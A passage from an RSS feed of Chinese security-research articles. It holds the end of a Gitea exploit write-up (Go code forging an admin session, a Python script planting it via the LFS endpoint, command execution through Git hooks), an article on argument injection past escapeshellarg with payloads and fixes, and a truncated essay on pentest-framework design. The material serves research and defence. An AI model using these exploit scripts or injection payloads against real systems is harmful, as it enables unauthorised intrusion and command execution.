href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#session&quot;&gt;漏洞五、伪造session提升权限&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;最简单的，我们可以向/etc/cron.d/中写入一个crontab配置文件，然后反弹获取shell。但通常gitea不会运行在root权限，所以我们需要思考其他方法。&lt;br&gt;gitea使用&lt;a href=&quot;https://github.com/go-macaron/session&quot;&gt;go-macaron/session&lt;/a&gt;这个第三方模块来管理session，默认使用文件作为session存储容器。我们来阅读&lt;a href=&quot;https://github.com/go-macaron/session/blob/master/file.go&quot;&gt;go-macaron/session源码&lt;/a&gt;：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bf5e7b4dc3cc55db609410b23a438f9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;613&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-bf5e7b4dc3cc55db609410b23a438f9c&quot; data-watermark-src=&quot;v2-9eb7a8a6f3ef1b257e2296dd641f1efd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;这里面有几个很重要的点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;session文件名为sid[0]/sid[1]/sid&lt;/li&gt;&lt;li&gt;对象被用Gob序列化后存入文件&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;package
main
import (
  &quot;fmt&quot;
  &quot;encoding/gob&quot;
  &quot;bytes&quot;
  &quot;encoding/hex&quot;
)
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
  gob.Register(v)
  }
   buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}
func main() {
  var uid int64 = 1
  obj := map[interface{}]interface{} {&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }
  data, err := EncodeGob(obj)
  if err != nil {
  fmt.Println(err)
  }
  edata := hex.EncodeToString(data)
  fmt.Println(edata)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其中，{&quot;_old_iod&quot;:&lt;br&gt;&quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cec39f215655fbd55a1977e1e5f900ff_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cec39f215655fbd55a1977e1e5f900ff&quot; data-watermark-src=&quot;v2-9538e95bc0f3bc1e535aa76b1801b955&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
import
requests
import jwt
import time
import base64
import logging
import sys
import json
from urllib.parse import quote
 
 
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
 
BASE_URL = &#39;http://your-ip:3000/vulhub/repo&#39;
JWT_SECRET = &#39;AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y&#39;
USER_ID = 1
REPO_ID = 1
SESSION_ID = &#39;11vulhub&#39;
SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562&#39;)
 
 
def generate_token():
  def decode_base64(data):
  missing_padding = len(data) % 4
  if missing_padding != 0:
  data += &#39;=&#39;* (4 - missing_padding)
  return base64.urlsafe_b64decode(data)
 
  nbf = int(time.time())-(60*60*24*1000)
  exp = int(time.time())+(60*60*24*1000)
 
  token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)
  return token.decode()
 
def gen_data():
  yield SESSION_DATA
  time.sleep(300)
  yield b&#39;&#39;
 
 
OID = f&#39;....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}&#39;
response = requests.post(f&#39;{BASE_URL}.git/info/lfs/objects&#39;, headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
}, json={
  &quot;Oid&quot;: OID,
  &quot;Size&quot;: 100000,
  &quot;User&quot; : &quot;a&quot;,
  &quot;Password&quot; : &quot;a&quot;,
  &quot;Repo&quot; : &quot;a&quot;,
  &quot;Authorization&quot; : &quot;a&quot;
})
logging.info(response.text)
 
response = requests.put(f&quot;{BASE_URL}.git/info/lfs/objects/{quote(OID,
safe=&#39;&#39;)}&quot;, data=gen_data(), headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Authorization&#39;: f&#39;Bearer {generate_token()}&#39;
 })
 &lt;/code&gt;&lt;p&gt;&lt;br&gt;这个脚本会将伪造的SESSION数据发送，并等待300秒后才关闭连接。在这300秒中，服务器上将存在一个名为“11vulhub.tmp”的文件，这也是session id。&lt;br&gt;带上这个session id，即可提升为管理员。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dda4f4e02021b5675b61871d00e8de4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;127&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9dda4f4e02021b5675b61871d00e8de4&quot; data-watermark-src=&quot;v2-7136e15e435578da17e4bb6dad48b71e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook&quot;&gt;漏洞六、利用HOOK执行任意命令&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;带上i_like_gitea=11vulhub.tmp这个Cookie，我们即可访问管理员账户。&lt;/p&gt;&lt;p&gt;然后随便找个项目，在设置中配置Git钩子。Git钩子是执行git命令的时候，会被自动执行的一段脚本。比如我这里用的pre-receive钩子，就是在commit之前会执行的脚本。我在其中加入待执行的命令touch /tmp/success：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0116e408d9f16943dbcd04281e42802e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;499&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0116e408d9f16943dbcd04281e42802e&quot; data-watermark-src=&quot;v2-550ed3d2be9de09fb12ef1f8d6b9b64f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;然后在网页端新建一个文件，点提交。进入docker容器，可见命令被成功执行：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4017029fca44f5c49c9db47e4c205686_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;90&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4017029fca44f5c49c9db47e4c205686&quot; data-watermark-src=&quot;v2-ca1d8fa8d7a91e678ced68b07f33c4a6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_4&quot;&gt;一些思考&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;整个漏洞链非常流畅，Go Web端的代码审计也非常少见，在传统漏洞越来越少的情况下，这些好思路将给安全研究者带来很多不一样的突破。&lt;br&gt;不过漏洞作者给出的POC实在是比较烂，基本离开了他自己的环境就不能用了，而且我也不建议用一键化的漏洞利用脚本来复现这个漏洞，原因是这个漏洞的利用涉及到一些不确定量，比如：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;gitea的$GITEA_CUSTOM，这个值影响到读取app.ini的那段POC&lt;/li&gt;&lt;li&gt;管理员的用户名和ID，这个可能需要猜。但其实我们也没必要必须伪造管理员的session，我们可以伪造任意一个用户的session，然后进入网站后再找找看看有没有管理员所创建的项目，如果有的话，就可以得知管理员的用户名了。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;另外，复现漏洞的时候也遇到过一些坑，比如gitea第一次安装好，如果不重启的话，他的session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。&lt;br&gt;如果目标系统使用的是sqlite做数据库，我们可以直接下载其数据库，并拿到他的密码哈希和另一个随机字符串，利用这两个值其实能直接伪造管理员的cookie（名为gitea_incredible），这一点我就不写了，大家可以自己查看文档。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-07-16-39835913</guid>
<pubDate>Mon, 16 Jul 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>谈escapeshellarg绕过与参数注入漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-05-08-36591451.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36591451&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b381f753958bcf64068ff996bf76ca7b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。&lt;/p&gt;&lt;h2&gt;0x01 从gitlist 0.6.0远程命令执行漏洞说起&lt;/h2&gt;&lt;p&gt;我们从gitlist说起，gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞。&lt;/p&gt;&lt;p&gt;在用户对仓库中代码进行搜索的时候，gitlist将调用&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;命令：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }
&lt;/code&gt;&lt;p&gt;其中，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;是搜索的关键字，&lt;code class=&quot;inline&quot;&gt;$branch&lt;/code&gt;是搜索的分支。&lt;/p&gt;&lt;p&gt;如果用户输入的&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;的值是&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;，将可以执行&lt;code class=&quot;inline&quot;&gt;id&lt;/code&gt;命令：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-025b25bf8f104854898807714b9dac55_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;665&quot; data-rawheight=&quot;74&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;0x02 escapeshellarg为什么没有奏效？&lt;/h2&gt;&lt;p&gt;导致这个漏洞的原因，有几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者对于&lt;code class=&quot;inline&quot;&gt;escapeshellarg&lt;/code&gt;函数的误解，造成参数注入&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;的参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;的值，将被直接执行&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;理论上，在经过&lt;code class=&quot;inline&quot;&gt;$query = escapeshellarg($query);&lt;/code&gt;处理后，&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;将变成一个由单引号包裹的字符串。但不出漏洞的前提是，这个字符串应该出现在“参数值”的位置，而不是出现在参数选项（option）中。&lt;/p&gt;&lt;p&gt;我们可以试一下如下命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9e039e85772fc4b3f1b3116e17c215c5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;168&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9e039e85772fc4b3f1b3116e17c215c5&quot; data-watermark-src=&quot;v2-c6f61d88a48b22311344485e716be6ab&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;如上图，我将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;放在了&lt;code class=&quot;inline&quot;&gt;-e&lt;/code&gt;参数的值的位置，此时它就仅仅是一个字符串而已，并不会被当成参数&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这应该作为本漏洞的最佳修复方法，也是git官方对pattern可能是用户输入的情况的一种解决方案（以下说明来自man-page）：&lt;/p&gt;&lt;blockquote&gt;-e &lt;br&gt;The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by&lt;br&gt;or.&lt;/blockquote&gt;&lt;p&gt;当然，gitlist的开发者用了另一种修复方案：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }&lt;/code&gt;&lt;p&gt;首先用&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;将&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;开头的非法字符移除，然后将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;拼接在&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的后面。&lt;/p&gt;&lt;p&gt;在命令行解析器中，&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;的意思是，此后的部分不会再包含参数选项（option）：&lt;/p&gt;&lt;blockquote&gt;A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.&lt;br&gt;If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.&lt;/blockquote&gt;&lt;p&gt;举个简单的例子，如果我们需要查看一个文件名是&lt;code class=&quot;inline&quot;&gt;--name&lt;/code&gt;的文件，我们就不能用&lt;code class=&quot;inline&quot;&gt;cat --name&lt;/code&gt;来读取，也不能用&lt;code class=&quot;inline&quot;&gt;cat &#39;--name&#39;&lt;/code&gt;，而必须要用&lt;code class=&quot;inline&quot;&gt;cat -- --name&lt;/code&gt;。从这个例子也能看出，单引号并不是区分一个字符串是“参数值”或“选项”的标准。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-294baf61c56ec7cfecbf9d00ddfb1ecc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;215&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-294baf61c56ec7cfecbf9d00ddfb1ecc&quot; data-watermark-src=&quot;v2-288a066ec9e202cacdac47f1babf7524&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以官方这个修复方案也是可以接受的，只不过第一步的&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;有点影响正常搜索功能。&lt;/p&gt;&lt;h2&gt;0x03 这不是PHP的专利&lt;/h2&gt;&lt;p&gt;熟悉PHP语言的同学一定对PHP执行命令的方法感受深刻，PHP内置的命令执行函数（如&lt;code class=&quot;inline&quot;&gt;shell_exec&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。&lt;/p&gt;&lt;p&gt;由于这个特点，PHP特别准备了两个过滤函数：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;escapeshellcmd&lt;/li&gt;&lt;li&gt;escapeshellarg&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;二者分工不同，前者为了防止用户利用shell的一些技巧（如分号、反引号等），执行其他命令；后者是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。&lt;/p&gt;&lt;p&gt;但我在0x02中也已经说清楚了，如果开发者在拼接命令的时候，将&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;直接给拼接在“参数选项”的位置上，那用escapeshellarg也就没任何效果了。&lt;/p&gt;&lt;p&gt;Java、Python等语言，执行命令的方法相对来说更加优雅：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import subprocess

query = &#39;id&#39;
r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)&lt;/code&gt;&lt;p&gt;默认情况下，python的subprocess接受的是一个列表。我们可以将用户输入的query放在列表的一项，这样也就避免了开发者手工转义query的工作，也能从根本上防御命令注入漏洞。但可惜的是，python帮开发者做的操作，也仅仅相当于是PHP中的escapeshellarg。我们可以试试令query等于&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-60e865d895273fd01be970c244f0dcca_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;176&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-60e865d895273fd01be970c244f0dcca&quot; data-watermark-src=&quot;v2-57cc73211fb0b0cb22c5fef181756722&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可见，仍然是存在参数注入漏洞的。原因还是0x02中说的原因，你把query放在了“参数选项”的位置上，无论怎么过滤，或者换成其他语言，都不可能解决问题。&lt;/p&gt;&lt;h2&gt;0x04 举一反三&lt;/h2&gt;&lt;p&gt;参数注入的例子还比较多，因为大部分的开发者都能理解命令注入的原理，但处理了命令注入后，往往都会忽略参数注入的问题。&lt;/p&gt;&lt;p&gt;最典型是案例是&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.md&quot;&gt;Wordpress PwnScriptum漏洞&lt;/a&gt;，PHP mail函数的第五个参数，允许直接注入参数，用户通过注入&lt;code class=&quot;inline&quot;&gt;-X&lt;/code&gt;参数，导致写入任意文件，最终getshell。&lt;/p&gt;&lt;p&gt;另一个典型的例子是&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823&quot;&gt;php-cgi CVE-2012-1823&lt;/a&gt; ，在cgi模式中，用户传入的querystring将作为cgi的参数传给php-cgi命令。而php-cgi命令可以用-d参数指定配置项，我们通过指定&lt;code class=&quot;inline&quot;&gt;auto_prepend_file=php://input&lt;/code&gt;，最终导致任意代码执行。&lt;/p&gt;&lt;p&gt;客户端上也出现过类似的漏洞，比如&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006&quot;&gt;Electron CVE-2018-1000006&lt;/a&gt;，我们通过注入参数&lt;code class=&quot;inline&quot;&gt;--gpu-launcher=cmd.exe /c start calc&lt;/code&gt;，来让electron内置的chromium执行任意命令。electron的最早给出的缓解措施也是在拼接点前面加上“--”。&lt;/p&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-05-08-36591451</guid>
<pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>浅谈分布式渗透测试框架的落地实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-16-35751510.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35751510&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75d02d21eee1d643ab4ad34ea0c0bd33_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;blockquote&gt;“本文读起来依旧还是非常枯燥”&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 Intro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文基于上一篇文章&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;《浅谈分布式渗透框架的架构与设计》&lt;/a&gt;的内容，并且实践了在上一篇文章中提到的各种想法和设计，勉勉强强算是落地实现。当然意料之中地会遇到各种各样的问题，不管最后解决方案是优雅还是丑陋，对今后的工作和兴趣开发都是很有益的经验积累。本文就简单谈一些关于项目研发落地实践出现的各种矛盾和启示。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Quick Look&lt;/b&gt;：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;业务需求模型特异性 vs 原始数据多样性&lt;/li&gt;&lt;li&gt;系统设计伪需求 vs Over-Designed&lt;/li&gt;&lt;li&gt;Service-Oriented Architecture vs 耦合痛点&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以上几个话题在下面的文章中都会涉及到，并没有先后顺序。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 业务需求模型特异性 vs 原始数据多样性&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在项目中，业务创造直接的价值，各种用户接口和相关交互都是建立在业务的基础上的；然而我们都知道，在我们文章中的这类系统有一个很大的特点：原始数据多且复杂，而且随着功能单元的增加，如果想要每一个功能单元产生的结果都能得到妥善处理，我认为有两种解决方案：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Formatter 或 API 协定：为每一个功能单元的结果（为每一类结果）都设定一个 Formatter 去直接转换为业务需求的结果；或者与原始数据约定 API。&lt;/li&gt;&lt;li&gt;数据转换协议或数据获取协议：设定数据转换协议或数据获取协议，Producer 和 Consumer 同时遵守一定规范，Producer 不需要关心 Consumer 到底想要什么样的模型，他只提供符合协议的中间模型，同样， Consumer 不关心接口怎么样，他想要的在中间模型中都可以拿得到。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这两种方案都可以一定程度上缓解 &lt;b&gt;业务需求模型特异性与原始数据多样性之间的矛盾&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Formatter 或 API 协定&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Q：为什么这两种方式会被并列来讲？有什么关联吗？&lt;/p&gt;&lt;p&gt;A：从本质上来说，这两种方式都是多样性向特异性妥协而产生的解决方案。何谓“妥协”？与需求方沟通或者协商其实就已经算是妥协了。当然这并不是说妥协不好，毕竟沟通成本也是一大成本。&lt;/p&gt;&lt;p&gt;值得另外提的是，业务的需求方并不一定是后端的用户接口层，当然原始数据的生产者也并不一定是整个系统的底层：这样的矛盾也同样存在于前后端。传统的前后端开发，需要一定的 API 规范（可能使用 Swagger 去规范 Rest API）去处理前端业务与后端原始数据的适配，前端需要的模型的特异性同样会和后端提供原始数据产生矛盾。&lt;/p&gt;&lt;p&gt;我相信虽然说 Rest API 或者其他什么的方案会解决一部分这类前后端协作开发上的问题，但是有一个隐藏矛盾是很难处理的，也会上这一个矛盾更加严重：&lt;/p&gt;&lt;p&gt;&lt;b&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/b&gt;&lt;/p&gt;&lt;p&gt;其实约定固定的模型 API 或者编写固定 Formatter 这种方式，是很难解决需求增长导致的特异性加重的问题的，也就意味着：&lt;/p&gt;&lt;p&gt;&lt;b&gt;新的需求 &amp;gt;&amp;gt; 新的 API &amp;gt;&amp;gt; 新的沟通与协商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我相信，每个 Coder 都比较想砍死需求改来改去和新需求分分钟冒出来的产品经理，对嘛？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;设定数据转换协议或者数据获取协议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这种方法其实是可以极大程度上缓解在上一种方法中提到的&lt;/p&gt;&lt;blockquote&gt;日益增长的客户业务方需求与现阶段旧的模型之间矛盾&lt;/blockquote&gt;&lt;p&gt;Q：这种方法和上一种有什么本质区别？&lt;/p&gt;&lt;p&gt;A：表面上看其实最大的不同是增加了一个中间模型，但是恰恰是这一个中间模型，会让需求方洞悉原始数据所有可以提供的数据，并且不需要通过每一个需求都约定 API，而是直接在中间模型上构建业务模型；除非新的需求并不是在现有的原始数据上可以满足的，这个时候才需要进行沟通，扩充中间模型。本质上来说，原始数据的多样性不需要频繁向业务数据进行妥协。&lt;/p&gt;&lt;p&gt;这种解决方案其实也并不只是一种设想，在某些领域和工程应用中已经实现，并且取得了非常良好的开发体验；笔者认为这种科学的方法其实本来就已经被很好实践和理论化（Proxy-Pattern）了：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;AMQP 中 Exchange 的设计&lt;/li&gt;&lt;li&gt;GraphQL 设计&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 系统设计伪需求 vs Over-designed&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Over-designed 就是过度设计，是在进行实现的时候没有正确把握复杂度导致了多余的设计。&lt;/p&gt;&lt;p&gt;其实在这个话题中，“伪需求” 与 Over-designed 的矛盾并不只发生在调度系统中，反而是在很多地方，都会发生 Over-desighed 的问题。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;底层想提供更多的 Useless 的功能导致底层 Over-designed &lt;/li&gt;&lt;li&gt;应用服务处理不好 Infrastructures 与业务逻辑之间的关系导致 Over-designed&lt;/li&gt;&lt;li&gt;被高估的可靠性需求导致 Over-designed&lt;/li&gt;&lt;li&gt;hype-driven development&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在这个话题中，我们其实很难像第一个话题一样，提出明确的方法去缓解“伪需求”带来的 Over-designed。从一开始接触 Code 直到现在，我一直难以抛弃掉一个信念，就是对自己代码过分的高估和多业务的过分高估。我觉得这其实更多的是一种诱惑，比如 HDD（Hype-Driven Development）对我来说一直是很大的诱惑。&lt;/p&gt;&lt;p&gt;当然我在这个话题中说到的“伪需求”并不是产品经理说的“业务伪需求”，而是对系统的某一个 Feature 没有做到正确估计其紧急程度或者可靠程度，凭空给自己增加了一些“负担”。这样的问题很容易导致代码冗余，过分追求设计；或者因为自己觉得这个 Feature 相关联的别的 Feature 可能需要在不久的未来实现，而自己花了更多的精力和时间在并不是这一阶段的工作上。我管这种“伪需求”叫作“负担”其实是不太妥当的，他其实并不是真的负担，反而有时候，对于一个热爱编程的 Coder 来说，它会成为一种有毒的诱惑。&lt;/p&gt;&lt;p&gt;学会抵制诱惑不去 Over-designed，学会”大道至简“我相信对于每一个 Coder 来说都会是一个漫长的过程。&lt;/p&gt;&lt;p&gt;说到这个，可能需要再讲一个例子：微服务有一万种美好的特性，但是真的所有的系统都使用微服务就一定好吗？恐怕这里是有很大问题的。服务簇的维护需要成本，服务的研发也需要成本，科学的协议设计，配置中心，协调中心，DevOps 都需要成本。一个 Passion Coder 自然是非常热爱这种 Cloud Native 和诸多特性的新技术，但是没有团队或者团队资源不够，人不够，都没有办法支撑微服务这种高复杂度的分布式系统；另外，更需要值得思考的是，你正在开发的系统值不值得微服务？当然，可能你的需求方突然砍掉了很多很多功能，你的系统突然不需要微服务了，因此你需不需要推倒重来？还是简单转为 SOA？这些其实都是一个合格的 Coder 